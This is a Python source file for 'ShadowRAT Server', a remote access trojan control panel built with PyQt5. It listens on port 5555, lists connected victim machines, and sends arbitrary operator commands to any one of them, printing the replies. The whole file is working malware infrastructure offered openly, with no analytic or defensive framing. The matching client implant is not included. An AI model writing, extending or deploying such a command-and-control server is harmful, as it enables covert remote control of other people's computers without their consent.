import sys
import socket
import threading
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QTextEdit, QLineEdit, QLabel, QListWidget, QMessageBox

HOST = '0.0.0.0'
PORT = 5555
clients = {}

class RATServerGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('ShadowRAT Server')
        self.setGeometry(100, 100, 600, 400)
        layout = QVBoxLayout()

        self.client_list = QListWidget()
        layout.addWidget(QLabel('Connected Clients:'))
        layout.addWidget(self.client_list)

        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText('Enter command')
        layout.addWidget(self.cmd_input)

        self.send_btn = QPushButton('Send Command')
        self.send_btn.clicked.connect(self.send_command)
        layout.addWidget(self.send_btn)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(QLabel('Output:'))
        layout.addWidget(self.output)

        self.setLayout(layout)
        threading.Thread(target=self.start_server, daemon=True).start()

    def start_server(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(5)
        self.append_output(f'[*] Listening on {HOST}:{PORT}')
        while True:
            conn, addr = s.accept()
            clients[str(addr)] = conn
            self.client_list.addItem(str(addr))
            threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True).start()

    def handle_client(self, conn, addr):
        self.append_output(f'[+] Connection from {addr}')
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                self.append_output(f'[{addr}] {data.decode(errors="ignore")}')
            except Exception as e:
                self.append_output(f'[-] Error: {e}')
                break
        conn.close()
        self.append_output(f'[-] Disconnected: {addr}')

    def send_command(self):
        selected = self.client_list.currentItem()
        if not selected:
            QMessageBox.warning(self, 'No Client', 'Select a client first.')
            return
        cmd = self.cmd_input.text()
        if not cmd:
            return
        addr = selected.text()
        conn = clients.get(addr)
        if conn:
            try:
                conn.send(cmd.encode())
                self.append_output(f'[Sent to {addr}] {cmd}')
            except Exception as e:
                self.append_output(f'[-] Send error: {e}')

    def append_output(self, text):
        self.output.append(text)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = RATServerGUI()
    window.show()
    sys.exit(app.exec_())
